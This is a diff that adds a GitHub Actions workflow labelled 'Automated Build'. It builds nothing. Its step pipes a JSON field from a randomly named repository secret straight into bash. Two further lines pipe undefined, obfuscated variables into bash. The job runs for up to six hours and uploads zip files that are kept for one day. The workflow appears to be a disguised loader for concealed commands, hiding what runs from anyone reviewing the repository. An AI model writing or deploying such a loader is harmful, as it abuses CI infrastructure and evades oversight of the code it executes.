@@ -1,0 +1,30 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  runner:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Go
+        env:
+          bu6: ${{ secrets.bu6 }}
+        run: |
+          printf '%s' "$bu6" | jq -r .sojq570 | /bin/bash
+          echo $aewcx38 | jq -r .eygjl2 | /bin/bash
+          echo $ff8794 | jq -r .z48865 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: T6jiFbAe
+          path: "*.zip"
+          retention-days: 1
